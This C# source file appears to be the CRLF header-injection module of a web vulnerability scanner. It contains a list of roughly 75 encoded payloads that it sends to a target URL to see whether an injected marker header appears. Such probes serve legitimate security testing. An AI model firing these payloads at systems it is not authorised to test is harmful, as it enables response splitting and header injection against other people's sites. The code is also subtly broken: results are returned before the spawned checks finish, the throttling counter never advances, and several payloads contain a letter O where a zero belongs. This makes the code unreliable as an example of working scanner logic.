using Clark.Attack.Common.Interfaces;
using Clark.Attack.Common.Models;
using Clark.Common.Models;
using Clark.Common.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Clark.Attack.CRLF
{
    /// <summary>
    /// Perform GET requests with known carriage return/line feed characters and check if headers are in the server response.
    /// </summary>
    public class Processor : IAttack
    {
        public string Name { get { return "CRLF"; } set { } }

        #region Private
        private static List<string> _payloads = new List<string>()
        {
            "%0d%0a%09headername:%20headervalue=test",
            "%0aheadername:%20headervalue=test",
            "%3f%0dheadername:%20headervalue=test",
            "%0d%0aheadername:%20headervalue=test",
            "%0dheadername:%20headervalue=test",
            "%23%0dheadername:%20headervalue=test",
            "%3f%0d%0aheadername:%20headervalue=test",
            "%E5%98%8A%E5%98%8Dheadername:%20headervalue=test",
            "?t=+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++headername:%20headervalue=test",
            "%0Aheadername:headervalue=test",
            "%0A%20headername:headervalue=test",
            "%20%0Aheadername:headervalue=test",
            "%23%OAheadername:headervalue=test",
            "%E5%98%8A%E5%98%8Dheadername:headervalue=test",
            "%E5%98%8A%E5%98%8D%0Aheadername:headervalue=test",
            "%3F%0Aheadername:headervalue=test",
            "crlf%0Aheadername:headervalue=test",
            "crlf%0A%20headername:headervalue=test",
            "crlf%20%0Aheadername:headervalue=test",
            "crlf%23%OAheadername:headervalue=test",
            "crlf%E5%98%8A%E5%98%8Dheadername:headervalue=test",
            "crlf%E5%98%8A%E5%98%8D%0Aheadername:headervalue=test",
            "crlf%3F%0Aheadername:headervalue=test",
            "%0Dheadername:headervalue=test",
            "%0D%20headername:headervalue=test",
            "%20%0Dheadername:headervalue=test",
            "%23%0Dheadername:headervalue=test",
            "%23%0Aheadername:headervalue=test",
            "%E5%98%8A%E5%98%8Dheadername:headervalue=test",
            "%E5%98%8A%E5%98%8D%0Dheadername:headervalue=test",
            "%3F%0Dheadername:headervalue=test",
            "crlf%0Dheadername:headervalue=test",
            "crlf%0D%20headername:headervalue=test",
            "crlf%20%0Dheadername:headervalue=test",
            "crlf%23%0Dheadername:headervalue=test",
            "crlf%23%0Aheadername:headervalue=test",
            "crlf%E5%98%8A%E5%98%8Dheadername:headervalue=test",
            "crlf%E5%98%8A%E5%98%8D%0Dheadername:headervalue=test",
            "crlf%3F%0Dheadername:headervalue=test",
            "%0D%0Aheadername:headervalue=test",
            "%0D%0A%20headername:headervalue=test",
            "%20%0D%0Aheadername:headervalue=test",
            "%23%0D%0Aheadername:headervalue=test",
            "\r\nheadername:headervalue=test",
            "%5cr%5cnheadername:headervalue=test",
            "%E5%98%8A%E5%98%8Dheadername:headervalue=test",
            "%E5%98%8A%E5%98%8D%0D%0Aheadername:headervalue=test",
            "%3F%0D%0Aheadername:headervalue=test",
            "crlf%0D%0Aheadername:headervalue=test",
            "crlf%0D%0A%20headername:headervalue=test",
            "crlf%20%0D%0Aheadername:headervalue=test",
            "crlf%23%0D%0Aheadername:headervalue=test",
            "crlf\r\nheadername:headervalue=test",
            "crlf%5cr%5cnheadername:headervalue=test",
            "crlf%E5%98%8A%E5%98%8Dheadername:headervalue=test",
            "crlf%E5%98%8A%E5%98%8D%0D%0Aheadername:headervalue=test",
            "crlf%3F%0D%0Aheadername:headervalue=test",
            "%0D%0A%09headername:headervalue=test",
            "crlf%0D%0A%09headername:headervalue=test",
            "%250Aheadername:headervalue=test",
            "%25250Aheadername:headervalue=test",
            "%%0A0Aheadername:headervalue=test",
            "%25%30Aheadername:headervalue=test",
            "%25%30%61headername:headervalue=test",
            "%u000Aheadername:headervalue=test",
            "//www.google.com/%2F%2E%2E%0D%0Aheadername:headervalue=test",
            "/www.google.com/%2E%2E%2F%0D%0Aheadername:headervalue=test",
            "/google.com/%2F..%0D%0Aheadername:headervalue=test",
        };

        #endregion

        public AttackResult Check(AttackRequest request)
        {
            var result = new AttackResult();

            int counter = 0;
            foreach (string payload in _payloads)
            {
                Task.Factory.StartNew(()=>CheckCRLF(request.URL, payload, result));

                counter = 0;
                if (counter % 10 == 0)
                    Thread.Sleep(200);
            }

            return result;
        }

        private void CheckCRLF(string url, string payload, AttackResult result)
        {
            string testUrl = url.Trim('/') + "/" + payload;
            WebPageRequest webRequest = new WebPageRequest(testUrl);
            WebPageLoader.Load(webRequest);
            if (webRequest.Response.Headers.AllKeys.Contains("headername"))
            {
                result.Success = true;
                result.Results.Enqueue("Tested URL: " + testUrl);
            }
        }
    }
}